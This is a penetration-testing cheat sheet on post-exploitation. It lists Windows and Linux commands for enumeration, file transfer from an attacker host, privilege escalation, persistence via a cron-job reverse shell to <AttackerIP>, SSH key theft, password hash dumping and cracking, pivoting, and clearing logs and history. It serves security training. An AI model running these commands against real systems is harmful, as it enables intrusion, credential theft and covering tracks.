
---

### Introduction to Post-Exploitation

Post-exploitation is the final phase of a penetration test. It encompasses the tactics, techniques, and procedures (TTPs) used by adversaries after gaining initial access to a target system. The actions taken depend on the level of access, the stealth required, and the configuration of the target system.

---

### Post-Exploitation Methodology

1. **Local Enumeration**
    
2. **Transferring Files**
    
3. **Upgrading Shells**
    
4. **Privilege Escalation**
    
5. **Persistence**
    
6. **Dumping and Cracking Hashes**
    
7. **Pivoting**
    
8. **Clearing Your Tracks**
    

---

### Windows Local Enumeration

#### Enumerating System Information

```
getuid
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,Installation
```

#### Enumerating Users & Groups

```
meterpreter > getuid
meterpreter > getprivs
whoami
whoami /priv
query user
net users
net user <username>
net localgroup Administrator
```

#### Enumerating Network Information

```
ipconfig /all
route print
arp -a
netstat -ano
netsh advfirewall show allprofiles
```

#### Enumerating Processes & Services

```
meterpreter > ps
meterpreter > migrate <PID>
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST /v
```

#### Automating Enumeration

Tool: [JAWS](https://github.com/411Hall/JAWS)

```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

---

### Linux Local Enumeration

#### Enumerating System Info

```
hostname
cat /etc/issue
cat /etc/*release
uname -r
env
lscpu
free -h
df -h
lsblk | grep sd
dpkg -l
```

#### Enumerating Users & Groups

```
whoami
groups <User>
cat /etc/passwd
cat /etc/passwd | grep -v /nologin
ls /home
who
last
lastlog
```

#### Enumerating Network Information

```
ip a s
cat /etc/networks
cat /etc/hosts
cat /etc/hostname
cat /etc/resolv.conf
```

#### Enumerating Processes & Cron Jobs

```
ps aux
top
crontab -l
ls -al /etc/cron*
```

#### Automating Enumeration

Tool: [LinEnum](https://github.com/rebootuser/LinEnum)

```
./LinEnum.sh
```

---

### Transferring Files to Targets

#### Python Web Server

```
python3 -m http.server <Port>
```

#### To Windows

```
certutil -urlcache -f http://<AttackerIP>/file FileName
```

#### To Linux

```
wget http://<AttackerIP>/file
```

---

### Upgrading Shells (Linux)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

### Privilege Escalation

#### Windows

Tool: [PrivscCheck](https://github.com/itm4n/PrivescCheck)

```
powershell.exe -ep bypass ". .\PrivscCheck.ps1; Invoke-PrivscCheck"
```

#### Linux - Weak Permissions

```
find / -not -type l -perm -o+w
ls -al /etc/shadow
openssl passwd -1 -salt abc Password
```

#### Linux - Sudo Privileges

```
sudo -l
sudo man man
!/bin/bash
```

---

### Persistence

#### Windows - Services

```
msf6 > use exploit/windows/local/persistence_service
```

#### Windows - RDP

```
meterpreter > run getgui -e -u <User> -p <Password>
xfreerdp /u:<User> /p:<Password> /v:<TargetIP>
```

#### Linux - SSH Keys

```
scp user@<TargetIP>:~/.ssh/id_rsa
ssh -i id_rsa user@<TargetIP>
```

#### Linux - Cron Jobs

```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1'" | crontab -
```

---

### Dumping & Cracking Hashes

#### Windows - NTLM

Tools: Mimikatz, Hashcat, John

```
meterpreter > hashdump
john --format=NT hashfile --wordlist=/path/to/wordlist
hashcat -a3 -m 1000 hashfile /path/to/wordlist
```

#### Linux - Shadow File

```
cat /etc/shadow
john --format=sha512crypt /path/to/hash --wordlist=/path/to/wordlist
hashcat -a3 -m 1800 hashfile /path/to/wordlist
```

---

### Pivoting

```
meterpreter > run autoroute -s <Network/Subnet>
portfwd add -l <LocalPort> -p <TargetPort> -r <TargetIP>
```

---

### Clearing Your Tracks

#### Windows

```
meterpreter > clearev
```

#### Linux

```
history -c
```

---

